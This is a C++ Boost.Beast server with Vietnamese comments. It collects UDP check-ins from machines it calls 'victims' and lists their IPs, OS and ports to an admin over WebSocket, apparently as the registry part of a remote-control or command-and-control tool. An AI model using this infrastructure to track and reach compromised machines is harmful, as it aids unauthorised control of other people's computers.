// =============================================================
// AURALINK REGISTRY SERVER (MAIN.CPP)
// Nhiệm vụ:
// 1. Lắng nghe UDP Broadcast từ các máy nạn nhân (Discovery)
// 2. Cung cấp danh sách nạn nhân cho Admin qua WebSocket
// =============================================================

// --- 1. CẤU HÌNH & THƯ VIỆN HỆ THỐNG ---
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00
#endif

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/ip/udp.hpp> 
#include <boost/asio/strand.hpp>
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <vector>
#include <algorithm>
#include <mutex> 
#include <chrono> 

// Link thư viện Windows Socket
#pragma comment(lib, "ws2_32.lib")

// --- 2. NAMESPACE & ĐỊNH NGHĨA ---
namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;
using udp = boost::asio::ip::udp;

// =============================================================
// PHẦN 3: CẤU TRÚC DỮ LIỆU
// =============================================================

struct VictimInfo {
    std::string ip;
    std::string id;
    std::string name;
    std::string os;
    std::string port; // Cổng WebSocket của Victim
    std::chrono::steady_clock::time_point last_seen;
};

// Forward declaration
class Session;

// =============================================================
// PHẦN 4: QUẢN LÝ SERVER (SERVER MANAGER)
// =============================================================

class ServerManager {
public:
    std::vector<VictimInfo> discovered_victims;
    std::mutex list_mutex; // Khóa bảo vệ danh sách (Thread-safe)

    // Xử lý khi nhận được gói tin UDP từ Victim
    void RegisterVictim(std::string ip, std::string id, std::string name, std::string os, std::string port) {
        std::lock_guard<std::mutex> lock(list_mutex);

        bool found = false;
        // Cập nhật thông tin nếu Victim đã tồn tại trong danh sách
        for (auto& v : discovered_victims) {
            if (v.id == id || v.ip == ip) {
                v.ip = ip;
                v.name = name;
                v.os = os;
                v.port = port;
                v.last_seen = std::chrono::steady_clock::now();
                found = true;
                break;
            }
        }

        // Nếu chưa có thì thêm mới
        if (!found) {
            std::cout << "[UDP] New Victim Found: " << ip << " | Name: " << name << "\n";
            discovered_victims.push_back({ ip, id, name, os, port, std::chrono::steady_clock::now() });
        }
    }

    // Tạo chuỗi danh sách gửi cho Admin
    std::string GetDiscoveredList() {
        std::lock_guard<std::mutex> lock(list_mutex);
        std::string listMsg = "LIST_DISCOVERED";

        // Format: LIST_DISCOVERED|IP,Name,OS,Port|...
        for (const auto& v : discovered_victims) {
            listMsg += "|" + v.ip + "," + v.name + "," + v.os + "," + v.port;
        }
        return listMsg;
    }

    void JoinAdmin(std::shared_ptr<Session> session) {
        std::cout << "[ADMIN] New Admin connected via WebSocket.\n";
    }
};

// =============================================================
// PHẦN 5: UDP LISTENER (LẮNG NGHE QUẢNG BÁ)
// =============================================================

void UDP_Listener_Thread(ServerManager& manager, unsigned short port) {
    try {
        net::io_context ioc;
        udp::socket socket(ioc, udp::endpoint(udp::v4(), port));

        char data[1024];
        udp::endpoint sender_endpoint;

        std::cout << "[UDP] Listening for broadcasts on port " << port << "...\n";

        while (true) {
            size_t length = socket.receive_from(net::buffer(data), sender_endpoint);
            std::string msg(data, length);

            // Gói tin mong đợi: "REGISTER|ID|Name|OS|Port"
            if (msg.rfind("REGISTER|", 0) == 0) {
                // Parse dữ liệu thủ công
                std::vector<std::string> parts;
                std::string s = msg;
                size_t pos = 0;
                while ((pos = s.find('|')) != std::string::npos) {
                    parts.push_back(s.substr(0, pos));
                    s.erase(0, pos + 1);
                }
                parts.push_back(s);

                // Kiểm tra đủ trường dữ liệu (Header + 4 fields)
                if (parts.size() >= 5) {
                    std::string id = parts[1];
                    std::string name = parts[2];
                    std::string os = parts[3];
                    std::string port = parts[4];
                    std::string ip = sender_endpoint.address().to_string();

                    manager.RegisterVictim(ip, id, name, os, port);
                }
            }
        }
    }
    catch (std::exception& e) {
        std::cerr << "[UDP Error]: " << e.what() << "\n";
    }
}

// =============================================================
// PHẦN 6: WEBSOCKET SESSION (KẾT NỐI VỚI CLIENT)
// =============================================================

class Session : public std::enable_shared_from_this<Session> {
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;
    ServerManager& manager_;

    std::vector<std::shared_ptr<std::string>> queue_;

public:
    explicit Session(tcp::socket&& socket, ServerManager& manager)
        : ws_(std::move(socket)), manager_(manager) {
    }

    void run() {
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
        ws_.async_accept(beast::bind_front_handler(&Session::on_accept, shared_from_this()));
    }

    void on_accept(beast::error_code ec) {
        if (ec) return;
        do_read();
    }

    // --- HÀM GỬI DỮ LIỆU AN TOÀN (THREAD-SAFE SEND) ---
    void send(std::string msg) {
        auto self = shared_from_this();
        auto msg_ptr = std::make_shared<std::string>(std::move(msg));

        net::post(ws_.get_executor(), [self, msg_ptr]() {
            if (!self->ws_.is_open()) return;

            self->queue_.push_back(msg_ptr);

            if (self->queue_.size() > 1) return;

            self->do_write();
            });
    }

    void do_write() {
        if (queue_.empty()) return;

        auto const& msg_ptr = queue_.front();
        ws_.text(true);
        ws_.async_write(net::buffer(*msg_ptr),
            beast::bind_front_handler(&Session::on_write, shared_from_this()));
    }

    void on_write(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec) {
            std::cerr << "Write Error: " << ec.message() << "\n";
            queue_.clear();
            return;
        }

        queue_.erase(queue_.begin()); // Xóa tin nhắn đã gửi xong

        if (!queue_.empty()) do_write(); // Gửi tiếp nếu còn
    }

    // --- HÀM ĐỌC DỮ LIỆU ---
    void do_read() {
        ws_.async_read(buffer_, beast::bind_front_handler(&Session::on_read, shared_from_this()));
    }

    void on_read(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec == websocket::error::closed) return;
        if (ec) return;

        std::string msg = beast::buffers_to_string(buffer_.data());
        handle_message(msg);

        buffer_.consume(buffer_.size());
        do_read();
    }

private:
    void handle_message(std::string msg) {
        // Admin xác thực
        if (msg.rfind("TYPE:ADMIN", 0) == 0) {
            manager_.JoinAdmin(shared_from_this());
            // Gửi ngay danh sách khi vừa kết nối
            send(manager_.GetDiscoveredList());
        }
        // Admin yêu cầu cập nhật danh sách (Polling)
        else if (msg == "GET_DISCOVERED_CLIENTS") {
            send(manager_.GetDiscoveredList());
        }
    }
};

// =============================================================
// PHẦN 7: TCP LISTENER (CHẤP NHẬN KẾT NỐI)
// =============================================================

class Listener : public std::enable_shared_from_this<Listener> {
    net::io_context& ioc_;
    tcp::acceptor acceptor_;
    ServerManager& manager_;
public:
    Listener(net::io_context& ioc, tcp::endpoint endpoint, ServerManager& manager)
        : ioc_(ioc), acceptor_(ioc), manager_(manager) {
        beast::error_code ec;
        acceptor_.open(endpoint.protocol(), ec);
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        acceptor_.bind(endpoint, ec);
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { std::cerr << "Listener Error: " << ec.message() << "\n"; return; }
    }
    void run() { do_accept(); }
private:
    void do_accept() {
        acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&Listener::on_accept, shared_from_this()));
    }
    void on_accept(beast::error_code ec, tcp::socket socket) {
        if (!ec) { std::make_shared<Session>(std::move(socket), manager_)->run(); }
        do_accept();
    }
};

// =============================================================
// PHẦN 8: HÀM MAIN (ENTRY POINT)
// =============================================================

int main() {
    auto const address = net::ip::make_address("0.0.0.0");

    // Cổng WebSocket cho Admin (TCP)
    unsigned short ws_port = 8082;
    // Cổng nhận tín hiệu từ Victim (UDP)
    unsigned short udp_port = 8081;

    int threads = 1;

    std::cout << "==========================================\n";
    std::cout << "   AURALINK REGISTRY SERVER \n";
    std::cout << "==========================================\n";
    std::cout << "[INFO] WebSocket Server (Admin) Port: " << ws_port << "\n";
    std::cout << "[INFO] UDP Discovery Listener Port:   " << udp_port << "\n";
    std::cout << "------------------------------------------\n";

    ServerManager manager;
    net::io_context ioc{ threads };

    // 1. Chạy thread lắng nghe UDP (Background)
    std::thread udpThread(UDP_Listener_Thread, std::ref(manager), udp_port);
    udpThread.detach();

    // 2. Chạy thread lắng nghe WebSocket (Main Loop)
    std::make_shared<Listener>(ioc, tcp::endpoint{ address, ws_port }, manager)->run();

    ioc.run();

    return 0;
}